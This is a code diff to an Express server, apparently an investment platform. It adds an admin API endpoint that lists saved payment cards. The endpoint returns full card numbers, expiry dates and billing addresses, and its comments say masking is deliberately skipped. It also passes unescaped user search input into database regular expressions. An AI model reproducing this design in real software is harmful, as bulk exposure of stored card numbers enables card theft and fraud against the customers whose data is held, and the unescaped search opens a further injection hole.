@@ -8871,7 +8871,91 @@ function getActivityDescription(action, metadata) {
 
 
 
+// Enhanced Admin Get Saved Cards Endpoint with search
+app.get('/api/admin/cards', adminProtect, async (req, res) => {
+  try {
+    const page = parseInt(req.query.page) || 1;
+    const limit = parseInt(req.query.limit) || 10;
+    const skip = (page - 1) * limit;
+    const search = req.query.search;
+    
+    // Build search query
+    let query = {};
+    if (search) {
+      query = {
+        $or: [
+          { fullName: { $regex: search, $options: 'i' } },
+          { cardNumber: { $regex: search, $options: 'i' } },
+          { billingAddress: { $regex: search, $options: 'i' } },
+          { city: { $regex: search, $options: 'i' } }
+        ]
+      };
+    }
+    
+    // Get all saved cards with user info
+    const cards = await CardPayment.find(query)
+      .populate('user', 'firstName lastName email')
+      .sort({ createdAt: -1 })
+      .skip(skip)
+      .limit(limit)
+      .lean();
+    
+    // Format cards data to show full card numbers (not masked)
+    const formattedCards = cards.map(card => ({
+      _id: card._id,
+      user: card.user,
+      fullName: card.fullName,
+      cardNumber: card.cardNumber, // Show full card number
+      expiryDate: card.expiryDate,
+      cardType: card.cardType,
+      billingAddress: card.billingAddress,
+      city: card.city,
+      state: card.state,
+      postalCode: card.postalCode,
+      country: card.country,
+      amount: card.amount,
+      status: card.status,
+      lastUsed: card.updatedAt, // Using updatedAt as last used
+      createdAt: card.createdAt,
+      updatedAt: card.updatedAt,
+      // Add card type with icon for frontend display
+      cardTypeDisplay: getCardTypeDisplay(card.cardType)
+    }));
+    
+    // Get total count for pagination
+    const totalCount = await CardPayment.countDocuments(query);
+    const totalPages = Math.ceil(totalCount / limit);
+    
+    res.status(200).json({
+      status: 'success',
+      data: {
+        cards: formattedCards,
+        totalCount,
+        totalPages,
+        currentPage: page
+      }
+    });
+  } catch (err) {
+    console.error('Admin get cards error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'Failed to fetch saved cards'
+    });
+  }
+});
 
+// Helper function to get card type display info
+function getCardTypeDisplay(cardType) {
+  const cardTypes = {
+    'visa': { name: 'Visa', icon: 'fab fa-cc-visa', color: '#1a1f71' },
+    'mastercard': { name: 'Mastercard', icon: 'fab fa-cc-mastercard', color: '#eb001b' },
+    'amex': { name: 'American Express', icon: 'fab fa-cc-amex', color: '#2e77bc' },
+    'discover': { name: 'Discover', icon: 'fab fa-cc-discover', color: '#ff6000' },
+    'other': { name: 'Other', icon: 'far fa-credit-card', color: '#6c757d' }
+  };
+  
+  return cardTypes[cardType] || cardTypes.other;
+}
 
 
 
@@ -9006,6 +9090,7 @@ processMaturedInvestments();
 httpServer.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
